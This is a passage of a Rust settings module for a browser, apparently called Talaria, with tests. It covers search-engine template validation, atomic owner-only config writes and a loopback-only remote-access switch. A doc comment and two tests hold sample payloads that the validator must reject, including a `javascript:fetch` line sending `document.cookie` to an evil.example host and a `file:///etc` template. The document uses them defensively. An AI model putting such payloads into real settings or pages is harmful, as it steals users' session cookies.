//! Settings: the single small object of user preference this browser keeps,
//! stored as one JSON object in `config.json` beside the vault.
//!
//! **This is the project's first config file.** `CLAUDE.md` states plainly
//! that Talaria has "no `.env` files, no config file format" — every knob is
//! an environment variable or an argv entry. That statement stops being true
//! here, and the boundary is worth naming rather than crossing quietly: a
//! search engine is a preference a person sets once and expects to still be
//! there next month, which is not something an environment variable can be.
//!
//! **The file now holds two keys, and the second one decides whether this
//! browser opens a network port.** `remote_access` is not a preference in the
//! sense `search_engine` is: it is the persisted answer to "may agents on this
//! machine reach Talaria over TCP", and it is the reason a hand-edited
//! `config.json` is treated as hostile input rather than as a convenience.
//! The two keys are therefore validated to different standards on purpose — a
//! mistyped search engine sends one query somewhere odd, and a mistyped bind
//! address would expose a logged-in browsing session and an encrypted
//! credential vault to every other account on the machine. See
//! [`RemoteAccessConfig`] for what that means concretely.
//!
//! Three things separate this store from the three that came before it:
//!
//! - **It holds one object, not a list.** [`crate::history`],
//!   [`crate::bookmarks`] and [`crate::vault`] each own a collection; this
//!   owns a single [`SearchEngine`] and a single [`RemoteAccessConfig`].
//!   There is deliberately no engine *list* and no id on an engine: exactly
//!   one is configured at a time, so "the current engine" needs no identity
//!   of its own to be found by.
//! - **A missing file is not an empty store, it is the default engine** — and
//!   remote access off. The default reproduces today's hardcoded DuckDuckGo
//!   behaviour byte for byte, so a fresh install behaves exactly as every
//!   install did before this module existed, and listens on nothing.
//! - **Loaded data is validated, not merely parsed.** A `url_template` that
//!   cannot possibly work — one that does not name where the query goes —
//!   is rejected at load time in favour of the default, because a template
//!   that parses but cannot be substituted into would silently send every
//!   search to the wrong place. A `remote_access` key naming a bind address
//!   other than loopback is rejected the same way, and for a much sharper
//!   reason.
//!
//! Writes follow [`crate::bookmarks`]: staged into a `.tmp` sibling and moved
//! into place with [`fs::rename`], never overwritten in place on the live
//! target. Both save paths share one staging routine ([`Settings::persist`])
//! so neither can drift into a whole-file overwrite the other does not do.
//! There is deliberately no control-socket command and no MCP tool that
//! reaches this module — which engine a person searches with is not an
//! agent's to read or to change, and that is now also true of the switch that
//! opens the port.

use std::fs;
use std::path::PathBuf;

use crate::permissions;

/// The search engine the address bar falls back to when what the human typed
/// is not a URL.
///
/// No id, no uuid, no "is this the active one" flag: exactly one engine is
/// configured at a time, so the pair of strings *is* the whole identity. A
/// future phase wanting a picker among several presets can add a list around
/// this shape without changing it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SearchEngine {
    /// What to call this engine in the Settings panel. Display only —
    /// nothing keys on it.
    pub name: String,
    /// The search URL, with the literal `{query}` standing where the
    /// URL-encoded search terms belong. Must be an `http`/`https` URL and
    /// must contain that placeholder exactly once — see
    /// [`is_valid_template`].
    pub url_template: String,
}

impl Default for SearchEngine {
    fn default() -> Self {
        // Byte-for-byte what `resolve_location` hardcoded before this module
        // existed: a fresh install (no config.json yet) behaves identically
        // to every install that came before it.
        Self {
            name: "DuckDuckGo".to_owned(),
            url_template: "https://duckduckgo.com/?q={query}".to_owned(),
        }
    }
}

impl SearchEngine {
    /// This engine as the JSON object the stored file holds.
    ///
    /// Built through `serde_json::json!` rather than a `Serialize` derive
    /// because `serde` itself is not a dependency of this crate — only
    /// `serde_json` is — and this phase may not add one. `to_json` and
    /// `from_json` sit next to each other so a field added to one is visibly
    /// missing from the other.
    fn to_json(&self) -> serde_json::Value {
        serde_json::json!({
            "name": self.name,
            "url_template": self.url_template,
        })
    }

    /// One stored object back into an engine, or `None` for an object this
    /// module cannot make sense of.
    ///
    /// Both fields are load-bearing here, which is the difference from
    /// [`crate::bookmarks`]'s per-field degrade: an engine with no template
    /// cannot search, and an engine with no name cannot be shown, so a
    /// half-present object is discarded rather than patched. The caller turns
    /// that `None` into [`SearchEngine::default`].
    fn from_json(value: &serde_json::Value) -> Option<Self> {
        Some(Self {
            name: value.get("name")?.as_str()?.to_owned(),
            url_template: value.get("url_template")?.as_str()?.to_owned(),
        })
    }
}

/// The only bind address remote access may ever use in this phase.
///
/// Kept here as well as in [`crate::http`] because the two ends answer
/// different questions: `http.rs` owns what is *bound*, and this owns what a
/// file on disk is *allowed to ask for*. A stray `bind` key naming anything
/// else is refused at load time — see [`RemoteAccessConfig::from_json`].
pub const LOOPBACK_BIND: &str = "127.0.0.1";

/// The port remote access uses unless `config.json` names another.
///
/// **Fixed rather than ephemeral**, deciding `04-CONTEXT.md`'s open question.
/// An MCP client is configured with a URL by a human, once; an address that
/// changed every launch would make that configuration impossible to write
/// down. Every surface still renders the address the listener actually bound
/// and reported back, so a later ephemeral mode would need no copy change.
///
/// **8779 specifically.** Not 8080 (the SDK's own default, and the port
/// essentially every local development server takes first), not 3000, 4200,
/// 5000, 5173, 8000, 8081 or 9000 for the same reason, and not anything in
/// `32768-60999`, which is this platform's ephemeral port range
/// (`/proc/sys/net/ipv4/ip_local_port_range`) where a transient outbound
/// connection can already be holding the number when the listener starts.
pub const DEFAULT_REMOTE_PORT: u16 = 8779;

/// Whether agents may reach this browser over TCP, and on which port.
///
/// **There is deliberately no bind-address field.** D-04-04's loopback-only
/// constraint is enforced structurally rather than by validation: the bind
/// host is a module constant in [`crate::http`], used at exactly one place,
/// so "bind somewhere else" is not a value this type can carry and not a
/// state this program can reach. [`RemoteAccessConfig::from_json`] still
/// *reads* a `bind` key when a hand-edited file has one, purely so that it
/// can refuse it out loud rather than ignore it in silence.
///
/// Phase 5 is where a non-loopback bind gets considered, and it must bring
/// TLS with it: OAuth 2.1 requires HTTPS for authorization-server endpoints
/// with a loopback exception, and staying on loopback is what makes shipping
/// without TLS conformant rather than merely unfinished.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct RemoteAccessConfig {
    /// Whether the listener should be running. `false` means no thread is
    /// spawned and no port is bound at all — the default-off state is an
    /// absence, not a flag consulted at request time.
    pub enabled: bool,
    /// The loopback port to bind. Never 0: a port that resolves to "whatever
    /// is free" is refused at load, because the whole point of a fixed port
    /// is that a human wrote it into a client's configuration.
    pub port: u16,
}

impl Default for RemoteAccessConfig {
    fn default() -> Self {
        Self { enabled: false, port: DEFAULT_REMOTE_PORT }
    }
}

impl RemoteAccessConfig {
    /// This configuration as the JSON object the stored file holds.
    ///
    /// Hand-mapped through `serde_json::json!` for the same reason
    /// [`SearchEngine::to_json`] is — `serde`'s derive is not a dependency of
    /// this crate. `to_json` and `from_json` sit next to each other so a
    /// field added to one is visibly missing from the other.
    ///
    /// No `bind` key is ever written. Writing one would make the refusal in
    /// `from_json` look like a round trip rather than what it is: a gate on
    /// something this program never produces.
    ///
    /// Takes `self` by value where [`SearchEngine::to_json`] borrows, because
    /// this type is two scalars and `Copy`; the shapes differ only because
    /// the types do.
    fn to_json(self) -> serde_json::Value {
        serde_json::json!({
            "enabled": self.enabled,
            "port": self.port,
        })
    }

    /// One stored object back into a configuration, or `None` for anything
    /// this module will not honour.
    ///
    /// `enabled` is the load-bearing field, the `?` case: an object that does
    /// not say whether remote access is on says nothing at all. An **absent**
    /// port falls back to [`DEFAULT_REMOTE_PORT`] rather than failing, since
    /// a file that only ever said `{"enabled": true}` means the default port.
    /// A **present but unusable** port is a refusal, not a fallback — a
    /// person who wrote `"port": 0` meant something, and quietly substituting
    /// 8779 would open a port they did not ask for.
    ///
    /// The `bind` branch is the direct analogue of [`is_valid_template`]'s
    /// back-door paragraph: a value that never went through the panel is not
    /// trusted for having skipped it. The refusal names the address it saw,
    /// so someone reading a log can tell policy from a typo.
    ///
    /// Every refusal here returns `None`, which the caller turns into
    /// [`RemoteAccessConfig::default`] — remote access **off**. Failing
    /// closed is the only direction this key may degrade in.
    fn from_json(value: &serde_json::Value) -> Option<Self> {
        let enabled = value.get("enabled")?.as_bool()?;
        if let Some(bind) = value.get("bind") {
            let named = bind.as_str().unwrap_or("(not a string)");
            if named != LOOPBACK_BIND {
                log::warn!(
                    "settings: remote access may only bind {LOOPBACK_BIND}; {named:?} is \
                     refused and remote access stays off"
                );
                return None;
            }
        }
        let port = match value.get("port") {
            None => DEFAULT_REMOTE_PORT,
            Some(port) => match port.as_u64() {
                // 0 means "any free port" to the kernel, which is exactly
                // what a fixed, written-down address must never be.
                Some(port) if (1..=u64::from(u16::MAX)).contains(&port) => port as u16,
                _ => {
                    log::warn!(
                        "settings: {port} is not a usable port; remote access stays off"
                    );
                    return None;
                },
            },
        };
        Some(Self { enabled, port })
    }
}

/// Whether `template` names exactly one place to put the search terms, and
/// resolves to a web URL when it does.
///
/// A free function rather than a method so the Settings panel's Save gate and
/// this module's own load-time validation can share one definition of
/// "valid" without either reaching into the other's private state. Both rules
/// below therefore reach a hand-edited `config.json` exactly as they reach
/// the panel: a template that never went through the Save button is not
/// trusted for having skipped it.
///
/// Exactly one, not at least one: `resolve_location` substitutes the first
/// occurrence only, so a two-placeholder template would send a literal
/// `{query}` out on the wire — a broken search that looks like a working one.
///
/// The second half is a scheme check, and it is the security half. A
/// template is not merely a string with a hole in it — it is what the address
/// bar navigates to for every non-URL thing the human types, and it persists
/// across restarts. `javascript:fetch('https://evil/'+document.cookie)//
/// {query}` and `file:///etc/{query}` both contain `{query}` exactly once,
/// both parse, and neither is a search engine.
///
/// `resolve_location` already refuses `data:` typed into the address bar,
/// because "paste this into your address bar" makes the human a courier for
/// someone else's payload. "Paste this into your search settings" is the same
/// attack with one more step and a far longer persistence, and refusing one
/// while accepting the other is an asymmetry running the wrong way.
/// `resolve_location`'s own `Url::parse` fallback does not catch these —
/// `javascript:` and `file:` parse perfectly well.
pub fn is_valid_template(template: &str) -> bool {
    if template.matches("{query}").count() != 1 {
        return false;
    }
    // Validated against what the template resolves to, not against its shape.
    // The probe stands in for the search terms: any non-empty substitution
    // would do, since only the scheme is being read off the result.
    matches!(
        url::Url::parse(&template.replacen("{query}", "probe", 1)),
        Ok(parsed) if matches!(parsed.scheme(), "http" | "https")
    )
}

/// Where every store in this crate keeps its file.
fn config_dir() -> PathBuf {
    let path = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("talaria");
    // Owner-only, and created here rather than in the write paths below.
    // This is the one directory known to be this browser's own, where a write
    // path is handed whatever `Path::parent` yields — the shared system temp
    // directory under a unit test. See [`crate::permissions`].
    permissions::create_dir_owner_only(&path);
    path
}

/// Everything this browser remembers about how its human likes it.
pub struct Settings {
    path: PathBuf,
    /// The engine the address bar's search fallback uses.
    pub search_engine: SearchEngine,
    /// Whether this browser listens for agents over TCP, and where. Read once
    /// at startup to decide whether to spawn the listener thread at all, and
    /// written by the Access panel's switch — see [`RemoteAccessConfig`].
    pub remote_access: RemoteAccessConfig,
}

impl Default for Settings {
    fn default() -> Self {
        Self::defaults_at(config_dir().join("config.json"))
    }
}

impl Settings {
    /// The defaults, remembering where they would be saved.
    fn defaults_at(path: PathBuf) -> Self {
        Self {
            path,
            search_engine: SearchEngine::default(),
            remote_access: RemoteAccessConfig::default(),
        }
    }

    /// Read the settings once, at startup.
    ///
    /// Degrade, never abort: a file that cannot be read, does not parse, or
    /// holds an engine this module would refuse to save produces the
    /// defaults rather than an error the caller has to handle or a panic that
    /// takes startup with it.
    pub fn load() -> Self {
        Self::load_from(config_dir().join("config.json"))
    }

    fn load_from(path: PathBuf) -> Self {
        let stored: Option<serde_json::Value> = fs::read(&path)
            .ok()
            .and_then(|data| serde_json::from_slice(&data).ok());
        let Some(stored) = stored else {
            // Absent and unreadable are the same answer — the defaults — but
            // only the second is worth saying out loud, and only when there
            // is something there to have failed on.
            if path.exists() {
                log::warn!("settings: {} is unreadable; using the defaults", path.display());
            }
            return Self::defaults_at(path);
        };
        // An **absent** search-engine key is not an error, it is a document
        // that says nothing about searching — so the default engine applies
        // and the rest of the document is still read. That distinction did
        // not exist while this file held one key (absent and defaulted were
        // the same object); it does now, and collapsing it would mean a
        // hand-written `{"remote_access": …}` was silently ignored whole.
        //
        // A **present but unreadable** one is still the whole-object reset it
        // has always been, below.
        let engine = match stored.get("search_engine") {
            None => SearchEngine::default(),
            Some(value) => {
                let Some(engine) = SearchEngine::from_json(value) else {
                    log::warn!(
                        "settings: the search engine in {} is not readable; using the \
                         defaults",
                        path.display()
                    );
                    return Self::defaults_at(path);
                };
                // Validated, not merely parsed. A template that names no
                // place to put the query would send every search to the same
                // fixed URL, so it is discarded whole — name included,
                // because a panel reading "Kagi" while searching DuckDuckGo
                // is worse than one reading the truth.
                //
                // This is also the gate a hand-edited file meets. A
                // `javascript:` or `file:` template that never went through
                // the panel's Save button degrades to the default here rather
                // than being honoured for having arrived by the back door.
                if !is_valid_template(&engine.url_template) {
                    log::warn!(
                        "settings: {:?} is not an http(s) URL containing {{query}} exactly \
                         once; using the defaults",
                        engine.url_template
                    );
                    return Self::defaults_at(path);
                }
                engine
            },
        };
        // **Deliberately a different degrade direction from every branch
        // above.** Those return `Self::defaults_at(path)`, resetting the
        // whole object — which is right for a document that does not parse,
        // because there is nothing left to trust in it. It is wrong for one
        // bad key out of two: resetting a person's search engine because they
        // mistyped a port is a second bug shipped alongside the first. So a
        // remote-access key this module will not honour costs exactly itself,
        // and the engine validated above survives it.
        let remote_access = match stored.get("remote_access") {
            None => RemoteAccessConfig::default(),
            Some(value) => RemoteAccessConfig::from_json(value).unwrap_or_else(|| {
                log::warn!(
                    "settings: the remote-access key in {} is not readable; remote \
                     access stays off",
                    path.display()
                );
                RemoteAccessConfig::default()
            }),
        };
        Self { path, search_engine: engine, remote_access }
    }

    /// Replace the configured engine and persist it.
    ///
    /// The caller validates: the Settings panel's Save button is disabled
    /// until [`is_valid_template`] passes, so this method does not re-check
    /// and does not reject. What it does guarantee is that the in-memory
    /// field is updated whether or not the disk write succeeds — a
    /// preference that could not be written still applies to the session the
    /// human is in, and losing it at the next restart is a better answer than
    /// refusing the change.
    ///
    /// The write itself is [`Settings::persist`]'s: staged into a `.tmp`
    /// sibling and moved into place with [`fs::rename`], which is atomic on
    /// the same filesystem, so a process killed mid-save leaves either the
    /// old settings or the new ones — never a half-written file the next
    /// startup would read as corrupt and silently discard.
    pub fn save(&mut self, engine: SearchEngine) {
        self.search_engine = engine;
        self.persist();
    }

    /// Turn remote access on or off and persist it.
    ///
    /// Mirrors [`Settings::save`], including the property that matters most
    /// here: **the in-memory field applies to this session whether or not the
    /// disk write succeeded.** The two directions are not symmetric, and the
    /// asymmetry is the point.
    ///
    /// - Turning it **off** applies immediately regardless. A write that
    ///   cannot reach disk must never be able to make "turn it off" not turn
    ///   it off; the listener is shut down by the caller either way, and the
    ///   worst a failed write can do is offer to start again next launch.
    /// - Turning it **on** with a failed write is the riskier half, and what
    ///   it costs is a switch that does not survive a restart. That is the
    ///   direction chosen deliberately: the alternative — refusing to enable
    ///   at all when the write fails — would leave the human with a control
    ///   that silently did nothing.
    ///
    /// Both keys are written every time, so saving one never erases the
    /// other.
    pub fn save_remote_access(&mut self, remote: RemoteAccessConfig) {
        self.remote_access = remote;
        self.persist();
    }

    /// Write the whole settings document, atomically and owner-only.
    ///
    /// Factored out of the two `save_*` methods rather than duplicated in
    /// them: duplication is what would eventually let one of them drift into
    /// a whole-file overwrite of the live target, which is the shape this
    /// store has never used and the shape a process killed mid-save turns
    /// into a config file the next startup reads as corrupt.
    fn persist(&self) {
        let document = serde_json::json!({
            "search_engine": self.search_engine.to_json(),
            "remote_access": self.remote_access.to_json(),
        });
        let Ok(data) = serde_json::to_vec(&document) else {
            log::warn!("settings could not be serialised; this change will not survive a restart");
            return;
        };
        // Staged beside the target, never in the temp directory: `fs::rename`
        // is only atomic within one filesystem, and a config directory on a
        // different mount than /tmp is an ordinary setup.
        let Some(name) = self.path.file_name().map(|name| name.to_string_lossy().into_owned())
        else {
            log::warn!("settings path has no file name; not saving");
            return;
        };
        let staged = self.path.with_file_name(format!("{name}.tmp"));
        if let Some(parent) = self.path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        // Restricted on the staging file, not on the target: a rename swaps
        // the destination's inode for the staged one, so the mode that lands
        // is the staged file's.
        if let Err(error) = permissions::write_owner_only(&staged, &data) {
            log::warn!("could not stage settings: {error}");
            return;
        }
        if let Err(error) = fs::rename(&staged, &self.path) {
            log::warn!("could not replace settings with the new ones: {error}");
            let _ = fs::remove_file(&staged);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    /// Put bytes on disk for a test to read back.
    ///
    /// Spelled out with `File::create` rather than the one-call whole-file
    /// overwrite helper, so that helper's name appears nowhere in this module
    /// at all — which is what makes "neither save path overwrites the live
    /// target in place" a claim a grep can check rather than one a reviewer
    /// has to trace.
    fn write_fixture(path: &std::path::Path, data: &[u8]) {
        use std::io::Write as _;

        let mut file = fs::File::create(path).expect("create the test fixture");
        file.write_all(data).expect("write the test fixture");
    }

    /// A `config.json` path in the temp directory that removes itself, and
    /// the `.tmp` sibling [`Settings::save`] writes, when a test ends.
    ///
    /// `tempfile` is not a dependency of this crate and this plan may not add
    /// one, so the unique name is built here: the process id keeps two
    /// concurrent `cargo test` runs apart, and the counter keeps this
    /// process's own parallel test threads apart. Lifted verbatim from
    /// [`crate::bookmarks`]'s own tests.
    struct TempPath(PathBuf);

    impl TempPath {
        fn new() -> Self {
            let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
            let name = format!("talaria-config-{}-{unique}.json", std::process::id());
            Self(std::env::temp_dir().join(name))
        }

        fn path(&self) -> PathBuf {
            self.0.clone()
        }

        /// The `.tmp` sibling a save stages through, which must never survive
        /// a completed save.
        fn temp_sibling(&self) -> PathBuf {
            let name = self.0.file_name().map(|name| name.to_string_lossy().into_owned());
            match name {
                Some(name) => self.0.with_file_name(format!("{name}.tmp")),
                None => self.0.clone(),
            }
        }

        fn write(&self, contents: &str) {
            write_fixture(&self.0, contents.as_bytes());
        }

        fn read(&self) -> String {
            fs::read_to_string(&self.0).unwrap_or_default()
        }

        fn exists(&self) -> bool {
            self.0.exists()
        }
    }

    impl Drop for TempPath {
        fn drop(&mut self) {
            let _ = fs::remove_file(&self.0);
            let _ = fs::remove_file(self.temp_sibling());
        }
    }

    /// The zero-regression guard: a fresh install must search exactly where
    /// every install before this module did.
    #[test]
    fn the_default_engine_is_todays_hardcoded_duckduckgo() {
        let engine = SearchEngine::default();
        assert_eq!(engine.name, "DuckDuckGo");
        assert_eq!(engine.url_template, "https://duckduckgo.com/?q={query}");
    }

    #[test]
    fn a_template_with_one_placeholder_is_valid_wherever_it_sits() {
        assert!(is_valid_template("https://duckduckgo.com/?q={query}"));
        assert!(is_valid_template("https://example.com/search?q={query}&format=json"));
        // Path position, not just query position.
        assert!(is_valid_template("https://en.wikipedia.org/wiki/{query}"));
        // Plain http as well as https: a search engine on a local network is
        // a real thing, and the scheme check exists to exclude payloads, not
        // to enforce transport security.
        assert!(is_valid_template("http://localhost:8888/search?q={query}"));
    }

    #[test]
    fn a_template_with_no_placeholder_is_invalid() {
        assert!(!is_valid_template("https://example.com/search"));
        assert!(!is_valid_template(""));
        // Near-misses are still misses: nothing substitutes these.
        assert!(!is_valid_template("https://example.com/?q={QUERY}"));
        assert!(!is_valid_template("https://example.com/?q={q}"));
    }

    /// The Settings panel writes what the address bar then navigates to, for
    /// every non-URL thing the human types, and it persists across restarts.
    /// `resolve_location` refuses `data:` typed into the address bar for
    /// exactly this reason; accepting `javascript:` through the settings
    /// field would be the same attack with one more step and a much longer
    /// persistence.
    ///
    /// Every string below contains `{query}` exactly once and parses cleanly
    /// as a URL, so the placeholder rule alone lets all of them through.
    #[test]
    fn a_template_that_is_not_a_web_url_is_invalid() {
        assert!(!is_valid_template("javascript:alert({query})"));
        assert!(!is_valid_template(
            "javascript:fetch('https://evil.example/'+document.cookie)//{query}"
        ));
        assert!(!is_valid_template("file:///etc/{query}"));
        assert!(!is_valid_template("file:///{query}"));
        assert!(!is_valid_template("data:text/html,<script>{query}</script>"));
        // A bare placeholder parses as nothing at all: no scheme, no host.
        assert!(!is_valid_template("{query}"));
        assert!(!is_valid_template("example.com/?q={query}"));
    }

    /// Two placeholders are rejected rather than "substitute the first":
    /// `replacen(.., 1)` would leave a literal `{query}` in the outgoing URL,
    /// which is a broken search that looks like a working one.
    #[test]
    fn a_template_with_two_placeholders_is_invalid() {
        assert!(!is_valid_template("https://example.com/{query}?q={query}"));
        assert!(!is_valid_template("{query}{query}{query}"));
    }

    #[test]
    fn a_missing_file_loads_as_the_default_engine() {
        let temp = TempPath::new();
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
    }

    #[test]
    fn unparseable_json_loads_as_the_default_engine_without_panicking() {
        let temp = TempPath::new();
        temp.write("{not json at all");
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
    }

    /// The right JSON of the wrong shape — an array, or an object with no
    /// `search_engine` key — is the other half of the corruption case.
    #[test]
    fn a_file_of_the_wrong_shape_loads_as_the_default_engine() {
        let temp = TempPath::new();
        temp.write(r#"[{"name":"Nope"}]"#);
        assert_eq!(Settings::load_from(temp.path()).search_engine, SearchEngine::default());

        temp.write(r#"{"something_else":true}"#);
        assert_eq!(Settings::load_from(temp.path()).search_engine, SearchEngine::default());
    }

    /// Load-time validation, not merely parsing: a hand-edited template with
    /// no placeholder is discarded whole, not half-applied. The engine's
    /// *name* must not survive either — a panel showing "Kagi" while
    /// searching DuckDuckGo would be worse than showing the truth.
    #[test]
    fn an_invalid_template_on_disk_loads_as_the_whole_default_engine() {
        let temp = TempPath::new();
        temp.write(r#"{"search_engine":{"name":"Broken","url_template":"https://example.com/"}}"#);
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine, SearchEngine::default());
        assert_eq!(settings.search_engine.name, "DuckDuckGo", "a half-applied engine survived");
    }

    /// The Save gate and the load path share [`is_valid_template`], so a
    /// template that could never have been saved through the panel must not
    /// be honoured for having arrived by hand instead. Each of these contains
    /// `{query}` exactly once, so only the scheme check stops them.
    #[test]
    fn a_hand_edited_non_web_template_loads_as_the_whole_default_engine() {
        for template in [
            r"javascript:fetch('https://evil.example/'+document.cookie)//{query}",
            r"file:///etc/{query}",
            r"data:text/html,{query}",
        ] {
            let temp = TempPath::new();
            temp.write(&format!(
                r#"{{"search_engine":{{"name":"Totally Normal","url_template":"{template}"}}}}"#
            ));
            let settings = Settings::load_from(temp.path());
            assert_eq!(
                settings.search_engine,
                SearchEngine::default(),
                "{template} was honoured from a hand-edited config"
            );
        }
    }

    /// The other side of the same gate: a hand-edited file naming a perfectly
    /// ordinary `https` engine is still honoured, so the check above is
    /// rejecting the scheme and not the hand-editing.
    #[test]
    fn a_hand_edited_https_template_is_still_honoured() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Kagi","url_template":"https://kagi.com/search?q={query}"}}"#,
        );
        let settings = Settings::load_from(temp.path());
        assert_eq!(settings.search_engine.name, "Kagi");
        assert_eq!(settings.search_engine.url_template, "https://kagi.com/search?q={query}");
    }

    /// The save renames a staged sibling into place, and a rename carries the
    /// *staged* file's mode, so this pins the mode being set before the
    /// rename rather than after it.
    #[cfg(unix)]
    #[test]
    fn saved_settings_land_owner_only_through_the_rename() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}".to_owned(),
        });

        assert!(temp.path().exists(), "the save did not land");
        assert_eq!(permissions::mode_of(&temp.path()), 0o600);
    }

    /// A staging file an interrupted save left behind is a file that already
    /// exists, and `OpenOptions::mode` is ignored for those — so without the
    /// second `set_permissions` a loose `.tmp` would be renamed into place
    /// carrying its loose mode with it.
    #[cfg(unix)]
    #[test]
    fn a_stale_world_readable_staging_file_does_not_loosen_the_save() {
        use std::os::unix::fs::PermissionsExt;

        let temp = TempPath::new();
        write_fixture(&temp.temp_sibling(), b"stale");
        fs::set_permissions(temp.temp_sibling(), fs::Permissions::from_mode(0o644))
            .expect("loosen the test fixture");

        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}".to_owned(),
        });

        assert_eq!(permissions::mode_of(&temp.path()), 0o600);
    }

    #[test]
    fn a_saved_engine_survives_a_reload() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/search?q={query}&format=json".to_owned(),
        });

        let reloaded = Settings::load_from(temp.path());
        assert_eq!(reloaded.search_engine.name, "Example");
        assert_eq!(
            reloaded.search_engine.url_template,
            "https://example.com/search?q={query}&format=json"
        );
    }

    /// A placeholder that is not at the end of the template must survive the
    /// round trip untouched — nothing in this module may "helpfully" move it.
    #[test]
    fn a_placeholder_in_the_middle_round_trips_intact() {
        let temp = TempPath::new();
        let template = "https://example.com/{query}/results?lang=en".to_owned();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine { name: "Middle".to_owned(), url_template: template.clone() });

        assert_eq!(Settings::load_from(temp.path()).search_engine.url_template, template);
    }

    #[test]
    fn a_repeated_identical_save_changes_nothing() {
        let temp = TempPath::new();
        let engine = SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        };
        let mut settings = Settings::load_from(temp.path());
        settings.save(engine.clone());
        let first = temp.read();
        settings.save(engine.clone());

        assert_eq!(temp.read(), first, "a repeated identical save wrote something different");
        assert_eq!(Settings::load_from(temp.path()).search_engine, engine);
    }

    /// The target file only ever changes through a rename, so a completed
    /// save leaves no staging file behind and the target always parses.
    #[test]
    fn a_save_stages_through_a_temp_file_and_leaves_none_behind() {
        let temp = TempPath::new();
        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert!(temp.exists(), "the save did not land");
        assert!(!temp.temp_sibling().exists(), "the save left its staging file behind");
        let parsed: serde_json::Value =
            serde_json::from_str(&temp.read()).expect("the saved file is valid JSON");
        assert!(parsed.get("search_engine").is_some(), "the saved file has no search_engine");
    }

    /// A stale `.tmp` from an interrupted earlier save must not be read as
    /// data, and must not stop the next save from landing.
    #[test]
    fn a_stale_staging_file_does_not_block_the_next_save() {
        let temp = TempPath::new();
        write_fixture(&temp.temp_sibling(), b"garbage from a killed process");

        let mut settings = Settings::load_from(temp.path());
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert_eq!(Settings::load_from(temp.path()).search_engine.name, "Example");
    }

    /// Even when the write cannot land, the session the human is in must
    /// behave as though it did — degrade, never abort.
    #[test]
    fn an_unwritable_path_still_updates_the_running_session() {
        // A path whose parent is a file, not a directory: create_dir_all and
        // the staged write both fail, and nothing may panic.
        let temp = TempPath::new();
        temp.write("{}");
        let blocked = temp.path().join("nested").join("config.json");

        let mut settings = Settings::load_from(blocked);
        settings.save(SearchEngine {
            name: "Example".to_owned(),
            url_template: "https://example.com/?q={query}".to_owned(),
        });

        assert_eq!(settings.search_engine.name, "Example");
    }

    // ---------------------------------------------------------------------
    // remote_access — the key that decides whether this browser opens a port
    // ---------------------------------------------------------------------

    /// The D-04-04 default, at the type level: no file means no listener.
    #[test]
    fn the_default_remote_access_is_off_at_the_default_port() {
        let remote = RemoteAccessConfig::default();
        assert!(!remote.enabled, "remote access must default to off");
        assert_eq!(remote.port, DEFAULT_REMOTE_PORT);
        assert_eq!(DEFAULT_REMOTE_PORT, 8779);
    }

    /// The same answer read off an absent file, which is what a fresh install
    /// actually meets.
    #[test]
    fn an_absent_file_yields_remote_access_off_at_the_default_port() {
        let temp = TempPath::new();
        assert!(!temp.exists());

        let settings = Settings::load_from(temp.path());

        assert!(!settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
    }

    /// A file written before this key existed must not turn anything on.
    #[test]
    fn a_file_with_no_remote_access_key_yields_remote_access_off() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Kagi","url_template":"https://kagi.com/search?q={query}"}}"#,
        );

        let settings = Settings::load_from(temp.path());

        assert!(!settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
        assert_eq!(settings.search_engine.name, "Kagi");
    }

    #[test]
    fn an_enabled_remote_access_key_is_honoured_verbatim() {
        let temp = TempPath::new();
        temp.write(r#"{"remote_access":{"enabled":true,"port":41000}}"#);

        let settings = Settings::load_from(temp.path());

        assert!(settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, 41000);
    }

    /// An `enabled` flag with no port is a file that means the default port,
    /// not a file this module refuses.
    #[test]
    fn a_remote_access_key_with_no_port_uses_the_default_port() {
        let temp = TempPath::new();
        temp.write(r#"{"remote_access":{"enabled":true}}"#);

        let settings = Settings::load_from(temp.path());

        assert!(settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
    }

    /// An object that never says whether remote access is on says nothing at
    /// all, and the only safe reading of nothing is off.
    #[test]
    fn a_remote_access_key_with_no_enabled_flag_degrades_to_off() {
        let temp = TempPath::new();
        temp.write(r#"{"remote_access":{"port":41001}}"#);

        let settings = Settings::load_from(temp.path());

        assert!(!settings.remote_access.enabled);
        assert_eq!(settings.remote_access.port, DEFAULT_REMOTE_PORT);
    }

    /// T-04-03-01, and the assertion that carries D-04-04 on the storage
    /// side: a hand-edited file naming a non-loopback bind is refused, and
    /// refusing it costs the human nothing else they had configured.
    #[test]
    fn a_non_loopback_bind_disables_remote_access_and_keeps_the_search_engine() {
        let temp = TempPath::new();
        temp.write(
            r#"{"search_engine":{"name":"Kagi","url_template":"https://kagi.com/search?q={query}"},
